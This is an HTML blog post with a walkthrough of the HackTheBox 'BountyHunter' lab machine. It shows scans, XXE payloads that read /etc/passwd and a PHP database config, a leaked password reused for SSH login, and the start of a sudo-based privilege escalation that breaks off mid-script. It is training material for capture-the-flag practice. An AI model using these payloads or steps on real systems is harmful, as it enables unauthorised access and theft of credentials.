<!DOCTYPE html><html lang="en-US" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="HackTheBox[BOUNTYHUNTER]" /><meta name="author" content="Anurag M" /><meta property="og:locale" content="en_US" /><meta name="description" content="Cyber Security Blogs by Anurag M" /><meta property="og:description" content="Cyber Security Blogs by Anurag M" /><link rel="canonical" href="/posts/HackTheBox-BOUNTYHUNTER/" /><meta property="og:url" content="/posts/HackTheBox-BOUNTYHUNTER/" /><meta property="og:site_name" content="V1NC1D4" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-11-20T07:00:00+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox[BOUNTYHUNTER]" /><meta name="twitter:site" content="@v1nc1d4" /><meta name="twitter:creator" content="@Anurag M" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"Anurag M"},"description":"Cyber Security Blogs by Anurag M","url":"/posts/HackTheBox-BOUNTYHUNTER/","@type":"BlogPosting","headline":"HackTheBox[BOUNTYHUNTER]","dateModified":"2021-11-20T21:33:08+05:30","datePublished":"2021-11-20T07:00:00+05:30","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/HackTheBox-BOUNTYHUNTER/"},"@context":"https://schema.org"}</script><title>HackTheBox[BOUNTYHUNTER] | V1NC1D4</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="V1NC1D4"><meta name="application-name" content="V1NC1D4"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/commons/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">V1NC1D4</a></div><div class="site-subtitle font-italic">Artist | Designer</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/v1nc1d4" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/v1nc1d4" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['hello','vincida.me'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HackTheBox[BOUNTYHUNTER]</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackTheBox[BOUNTYHUNTER]</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Anurag M </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, Nov 20, 2021, 7:00 AM +0530" >Nov 20, 2021<i class="unloaded">2021-11-20T07:00:00+05:30</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sat, Nov 20, 2021, 9:33 PM +0530" >Nov 20, 2021<i class="unloaded">2021-11-20T21:33:08+05:30</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2128 words">11 min read</span></div></div><div class="post-content"><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/bountyhunter/hunter.jpeg" alt="bountyhunter" /></p><p>BountyHunter is an easy rated CTF style machine at <a href="https://hackthebox.eu">Hackthebox</a>, the machine focuses on XXE (XML External Entity) injection to gain initial access to the machine and for escalating privilege to root we need to study the given python script in-order find the vulnerability and exploit it.</p><h2 id="about-the-machine">About The Machine</h2><div class="table-wrapper"><table><thead><tr><th>Name<th>OS<th>Difficulty<th>Creator<tbody><tr><td><a href="https://www.hackthebox.eu/home/machines/profile/359">BountyHunter</a><td>Linux<td>Easy<td><a href="https://www.hackthebox.eu/home/users/profile/280547">ejedev</a></table></div><div class="table-wrapper"><table><thead><tr><th>Blood<th>User<tbody><tr><td>User<td><a href="https://www.hackthebox.eu/home/users/profile/52045">InfoSecJack</a><tr><td>Root<td><a href="https://www.hackthebox.eu/home/users/profile/52045">InfoSecJack</a></table></div><h2 id="reconnaissance">Reconnaissance</h2><h3 id="nmap">Nmap</h3><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>┌─[eu-free-3]─[10.10.14.208]─[vincida@vincida]─[~/Desktop/HTB/LAB/bountyhunter]
└──╼ <span class="o">[</span>★]<span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-A</span> 10.10.11.100
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-11-20 02:12 IST
Nmap scan report <span class="k">for </span>10.10.11.100
Host is up <span class="o">(</span>0.43s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 963 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>, 35 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 <span class="o">(</span>RSA<span class="o">)</span>
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Bounty Hunters
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>190.27 seconds
</pre></table></code></div></div><p>From the initial nmap scan we can find that port 22 and 80 are open the machine, which are standard SSH and HTTP ports. As SSH port needs credentials to login, Let’s take a look at the webpage.</p><h3 id="http">HTTP</h3><p>Checking the webpage</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/bountyhunter/1.png" alt="bountyhunter" /></p><p>We can find a simple landing page, but on further exploration we could find that the <code class="language-plaintext highlighter-rouge">portal button</code> redirects to <code class="language-plaintext highlighter-rouge">portal.php</code></p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/bountyhunter/2.png" alt="bountyhunter" /></p><p>The portal page we found is under development. But we are given a link to the <code class="language-plaintext highlighter-rouge">Bounty Tracker</code> for testing purpose.</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/bountyhunter/3.png" alt="bountyhunter" /></p><p>We have a nice little form where we could input some data that will get stored in the database.</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/bountyhunter/4.png" alt="bountyhunter" /></p><p>If you remeber, on the landing page there was a line saying <code class="language-plaintext highlighter-rouge">Bounty Hunters - Security Researchers - Can use Burp</code> let’s power-up our burpsuite to find some juicy information.</p><p>So we fired up our proxy, entered the values and intercepted the request, we can find that the data we entered is encoded to base64 and sent to the server.</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/bountyhunter/5.png" alt="bountyhunter" /></p><p>Let’s decode the encoded data</p><div lang="xml" class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="cp">&lt;?xml  version="1.0" encoding="ISO-8859-1"?&gt;</span>
		<span class="nt">&lt;bugreport&gt;</span>
		<span class="nt">&lt;title&gt;</span>Test<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;cwe&gt;</span>123<span class="nt">&lt;/cwe&gt;</span>
		<span class="nt">&lt;cvss&gt;</span>1234<span class="nt">&lt;/cvss&gt;</span>
		<span class="nt">&lt;reward&gt;</span>1337<span class="nt">&lt;/reward&gt;</span>
		<span class="nt">&lt;/bugreport&gt;</span>
</pre></table></code></div></div><p>Here we can see that the data is sent in the form of XML, which means that the webpage is likely vulnerable to <code class="language-plaintext highlighter-rouge">XML External Entities (XXE) injection</code></p><p>To know more about the vulnerability, check out this <a href="https://www.synack.com/blog/a-deep-dive-into-xxe-injection/">blog</a></p><p>Let’s construct a XXE payload so that we can pull out some sensitive files from the server and confirm the vulnerabilty.</p><div lang="xml" class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="cp">&lt;?xml  version="1.0" encoding="ISO-8859-1"?&gt;</span>
<span class="cp">&lt;!DOCTYPE data [&lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;</span> ]&gt;
<span class="nt">&lt;bugreport&gt;</span>
<span class="nt">&lt;title&gt;</span>test<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;cwe&gt;</span>123<span class="nt">&lt;/cwe&gt;</span>
<span class="nt">&lt;cvss&gt;</span>1337<span class="nt">&lt;/cvss&gt;</span>
<span class="nt">&lt;reward&gt;</span><span class="ni">&amp;file;</span><span class="nt">&lt;/reward&gt;</span>
<span class="nt">&lt;/bugreport&gt;</span>
</pre></table></code></div></div><p>Let’s encode the payload with base64 and then url encode it and sent it to server using burpsuite.</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/bountyhunter/6.png" alt="bountyhunter" /></p><p>And it worked, we were able to pull out <code class="language-plaintext highlighter-rouge">passwd</code> (/etc/passwd) file from the server.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash   &lt;<span class="nt">---</span> possible user on the machine
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
</pre></table></code></div></div><p>Now it’s time to infiltrate into the system, as we know that the input data’s are being stored in database, there has to be a database <code class="language-plaintext highlighter-rouge">configuration</code> file.</p><p>Let’s use <code class="language-plaintext highlighter-rouge">Gobuster</code> to search for possible configuration file.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre>┌─[eu-free-3]─[10.10.14.208]─[vincida@vincida]─[~/Desktop/HTB/LAB/bountyhunter]
└──╼ <span class="o">[</span>★]<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.11.100/ <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt <span class="nt">-x</span> php
<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:                     http://10.10.11.100/
<span class="o">[</span>+] Method:                  GET
<span class="o">[</span>+] Threads:                 10
<span class="o">[</span>+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
<span class="o">[</span>+] Negative Status codes:   404
<span class="o">[</span>+] User Agent:              gobuster/3.1.0
<span class="o">[</span>+] Extensions:              php
<span class="o">[</span>+] Timeout:                 10s
<span class="o">===============================================================</span>
2021/11/20 03:52:48 Starting gobuster <span class="k">in </span>directory enumeration mode
<span class="o">===============================================================</span>
/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 25169]
/resources            <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.11.100/resources/]
/assets               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 313] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.11.100/assets/]   
/portal.php           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 125]                                     
/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 310] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.11.100/css/]      
/db.php               <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0]          &lt;<span class="nt">---</span> database configuratin file                             
/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 309] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.11.100/js/]
/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277] 
                                                                                    
<span class="o">===============================================================</span>
2021/11/20 04:00:29 Finished
<span class="o">===============================================================</span>
</pre></table></code></div></div><p>Yes, we have it. Let’s create a new payload by twweaking the old one to read the content of <code class="language-plaintext highlighter-rouge">db.php</code></p><div lang="xml" class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="cp">&lt;?xml  version="1.0" encoding="ISO-8859-1"?&gt;</span>
<span class="cp">&lt;!DOCTYPE bugreport [&lt;!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=db.php"&gt;</span> ]&gt;
<span class="nt">&lt;bugreport&gt;</span>
<span class="nt">&lt;title&gt;</span>test<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;cwe&gt;</span>123<span class="nt">&lt;/cwe&gt;</span>
<span class="nt">&lt;cvss&gt;</span>1337<span class="nt">&lt;/cvss&gt;</span>
<span class="nt">&lt;reward&gt;</span><span class="ni">&amp;file;</span><span class="nt">&lt;/reward&gt;</span>
<span class="nt">&lt;/bugreport&gt;</span>
</pre></table></code></div></div><p>Encode the payload and sent it the server, we get base64 encoded <code class="language-plaintext highlighter-rouge">db.php</code> as response.</p><h2 id="gaining-foothold">Gaining Foothold</h2><p>Let’s decode the base64 encoded <code class="language-plaintext highlighter-rouge">db.php</code></p><div lang="php" class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="c1">// TODO -&gt; Implement login system with the database.</span>
<span class="nv">$dbserver</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
<span class="nv">$dbname</span> <span class="o">=</span> <span class="s2">"bounty"</span><span class="p">;</span>
<span class="nv">$dbusername</span> <span class="o">=</span> <span class="s2">"admin"</span><span class="p">;</span>
<span class="nv">$dbpassword</span> <span class="o">=</span> <span class="s2">"m19RoAU0hP41A1sTsq6K"</span><span class="p">;</span>
<span class="nv">$testuser</span> <span class="o">=</span> <span class="s2">"test"</span><span class="p">;</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>We have the possible username and password, let’s try to use this credentials to login using SSH.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>┌─[eu-free-3]─[10.10.14.208]─[vincida@vincida]─[~/Desktop/HTB/LAB/bountyhunter]
└──╼ <span class="o">[</span>★]<span class="nv">$ </span>ssh admin@10.10.11.100
The authenticity of host <span class="s1">'10.10.11.100 (10.10.11.100)'</span> can<span class="s1">'t be established.
ECDSA key fingerprint is SHA256:3IaCMSdNq0Q9iu+vTawqvIf84OO0+RYNnsDxDBZI04Y.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>10.10.11.100<span class="s1">' (ECDSA) to the list of known hosts.
admin@10.10.11.100'</span>s password: 
Permission denied, please try again.
admin@10.10.11.100<span class="s1">'s password: 
Permission denied, please try again.
admin@10.10.11.100'</span>s password: 
admin@10.10.11.100: Permission denied <span class="o">(</span>publickey,password<span class="o">)</span><span class="nb">.</span>
</pre></table></code></div></div><p>These credentials does not match. Going back to the <code class="language-plaintext highlighter-rouge">passwd</code> file there is a user called <code class="language-plaintext highlighter-rouge">development</code> let’s try to login using <code class="language-plaintext highlighter-rouge">development:m19RoAU0hP41A1sTsq6K</code></p><p>Luckily, it worked..!!!</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre>┌─[eu-free-3]─[10.10.14.208]─[vincida@vincida]─[~/Desktop/HTB/LAB/bountyhunter]
└──╼ <span class="o">[</span>★]<span class="nv">$ </span>ssh development@10.10.11.100
development@10.10.11.100<span class="s1">'s password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 19 Nov 2021 10:52:25 PM UTC

  System load:  0.03              Processes:             285
  Usage of /:   25.6% of 6.83GB   Users logged in:       1
  Memory usage: 27%               IPv4 address for eth0: 10.10.11.100
  Swap usage:   0%

  =&gt; There is 1 zombie process.


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Nov 19 21:25:12 2021 from 10.10.14.198
development@bountyhunter:~$ 
</span></pre></table></code></div></div><p>User flag can be found in the user’s home directory</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>development@bountyhunter:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 56
drwxr-xr-x 5 development development  4096 Nov 19 22:53 <span class="nb">.</span>
drwxr-xr-x 3 root        root         4096 Jun 15 16:07 ..
lrwxrwxrwx 1 root        root            9 Apr  5  2021 .bash_history -&gt; /dev/null
<span class="nt">-rw-r--r--</span> 1 development development   220 Feb 25  2020 .bash_logout
<span class="nt">-rw-r--r--</span> 1 development development  3771 Feb 25  2020 .bashrc
drwx------ 2 development development  4096 Apr  5  2021 .cache
lrwxrwxrwx 1 root        root            9 Jul  5 05:46 .lesshst -&gt; /dev/null
drwxrwxr-x 3 development development  4096 Apr  6  2021 .local
<span class="nt">-rw-r--r--</span> 1 development development   807 Feb 25  2020 .profile
drwx------ 2 development development  4096 Apr  7  2021 .ssh
<span class="nt">-rw-------</span> 1 development development 11901 Nov 19 21:03 .viminfo
<span class="nt">-rw-r--r--</span> 1 root        root          471 Jun 15 16:10 contract.txt
<span class="nt">-rwxrwxrwx</span> 1 development development    37 Nov 19 22:53 flag
<span class="nt">-r--r-----</span> 1 root        development    33 Nov 19 20:21 user.txt
development@bountyhunter:~<span class="nv">$ </span><span class="nb">cat </span>user.txt  &lt;<span class="nt">---</span> user flag
db9cc194ad959e2a5c3a2e6384a80585
development@bountyhunter:~<span class="err">$</span>
</pre></table></code></div></div><h2 id="privilege-escalation">Privilege Escalation</h2><p>There is an unusual txt file on the home directory, <code class="language-plaintext highlighter-rouge">contract.txt</code> let’s find out what is it says.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>development@bountyhunter:~<span class="nv">$ </span><span class="nb">cat </span>contract.txt 
Hey team,

I<span class="s1">'ll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.

This has been our first job since the "rm -rf" incident and we can'</span>t mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.

I <span class="nb">set </span>up the permissions <span class="k">for </span>you to <span class="nb">test </span>this. Good luck.

<span class="nt">--</span> John
development@bountyhunter:~<span class="err">$</span>
</pre></table></code></div></div><p>The note says that <code class="language-plaintext highlighter-rouge">there was an incident of complete data loss and this is their first job since the incident took place. So they have to be extra careful this time to avoid such incidents. Their job is to test an internal application of Skytrain Inc that works based on ticket validation, but the ticket validation is failing. They have to find out why the ticket validation fails. Also John says that to test this application he has given permission to the users.</code></p><p>Let’s check user permissions</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>development@bountyhunter:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>development on bountyhunter:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User development may run the following commands on bountyhunter:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
development@bountyhunter:~<span class="err">$</span>
</pre></table></code></div></div><p>The user <code class="language-plaintext highlighter-rouge">development</code> is allowed to run a python script <code class="language-plaintext highlighter-rouge">/opt/skytrain_inc/ticketValidator.py</code> with <code class="language-plaintext highlighter-rouge">python3.8</code> as root without any password.</p><p>Let’s take a look at <code class="language-plaintext highlighter-rouge">ticketValidator.py</code></p><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
</pre><td class="rouge-code"><pre><span class="c1">#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.
</span>
<span class="k">def</span> <span class="nf">load_file</span><span class="p">(</span><span class="n">loc</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">loc</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">".md"</span><span class="p">):</span>
        <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="n">loc</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Wrong file type."</span><span class="p">)</span>
        <span class="nb">exit</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">evaluate</span><span class="p">(</span><span class="n">ticketFile</span><span class="p">):</span>
    <span class="c1">#Evaluates a ticket to check for ireggularities.
</span>    <span class="n">code_line</span> <span class="o">=</span> <span class="bp">None</span>
